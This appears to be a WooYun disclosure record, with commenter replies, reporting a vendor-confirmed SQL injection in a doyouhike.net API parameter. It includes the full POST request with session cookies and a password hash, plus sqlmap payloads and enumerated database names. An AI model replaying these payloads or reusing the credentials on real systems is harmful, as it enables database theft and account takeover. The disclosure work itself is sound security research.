{"id": 76112, "wybug_id": "wooyun-2015-0165623", "wybug_title": "磨房网SQL注入七（5库涉及百万用户数据）", "wybug_corp": "doyouhike.net", "wybug_author": "天地不仁 以万物为刍狗", "wybug_date": "2015-12-29 09:39", "wybug_open_date": "2016-02-09 23:29", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-09：\t细节向公众公开  简要描述： 磨小驴··· 详细说明：  POST数据包：\nPOST /api/place/auto_output_nodes HTTP/1.1Host: www.doyouhike.netContent-Length: 11Accept: application/json, text/javascript, */*; q=0.01Origin: http://www.doyouhike.netX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 UBrowser/5.5.7852.203 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://www.doyouhike.net/my/visited/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: pgv_pvi=8593548288; PHPSESSID=r12ljv192rvvt8o83ttd0qs8p1; pgv_si=s8301168640; __utmt=1; dyh_userid=3009909; dyh_password=118c3ec5e8b073f978fc0b4d45e601c5; __utma=151782572.1166654032.1451292000.1451312128.1451316021.5; __utmb=151782572.27.10.1451316021; __utmc=151782572; __utmz=151782572.1451292000.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); dyh_lastactivity=1451318176node_name=a\n参数 node_name 可注入\n\n\n\n看见 g3rc 有三百多张表就没跑了  正好看见 user 表 于是跑了下数量\n\nbizrc 数据库里的各类表数量：\n\n   漏洞证明：  \nsqlmap identified the following injection point(s) with a total of 57 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: node_name=a%' AND 3078=3078 AND '%'='    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: node_name=a%' AND (SELECT * FROM (SELECT(SLEEP(5)))prtU) AND '%'='---[23:59:51] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.12[23:59:51] [INFO] fetching database names[23:59:51] [INFO] fetching number of databases[23:59:51] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[23:59:51] [INFO] retrieved: 5[23:59:53] [INFO] retrieved: information_schema[00:01:02] [INFO] retrieved: bizrc[00:01:22] [INFO] retrieved: click[00:01:40] [INFO] retrieved: g3rc[00:01:57] [INFO] retrieved: sphinxavailable databases [5]:[*] bizrc[*] click[*] g3rc[*] information_schema[*] sphinx[00:02:26] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 31 times[00:02:26] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\www.doyouhike.net'[*] shutting down at 00:02:26\n   修复方案：     版权声明：转载请注明来源 天地不仁 以万物为刍狗@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-12-29 10:19 厂商回复： 严重漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-29 09:41 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1101 漏洞数:257        | 1.乌云最帅的男人                        ...)\t\t \n  哈哈 好久没见你发漏洞了    \n     2015-12-29 10:26 |    \t\t天地不仁 以万物为刍狗 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:342        | 本乌云账户唯一QQ 177712xx4)\t\t \n  @牛 小 帅 所以发几个漏洞出来证明我还活着。。。。    \n     2015-12-29 10:30 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1101 漏洞数:257        | 1.乌云最帅的男人                        ...)\t\t \n  @天地不仁 以万物为刍狗 可惜了 没走首页    \n     2015-12-29 10:39 |    \t\t天地不仁 以万物为刍狗 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:342        | 本乌云账户唯一QQ 177712xx4)\t\t \n  @牛 小 帅 很正常   我发的漏洞 基本上不会走首页      \n     2015-12-29 10:43 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1101 漏洞数:257        | 1.乌云最帅的男人                        ...)\t\t \n  @天地不仁 以万物为刍狗 懂了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}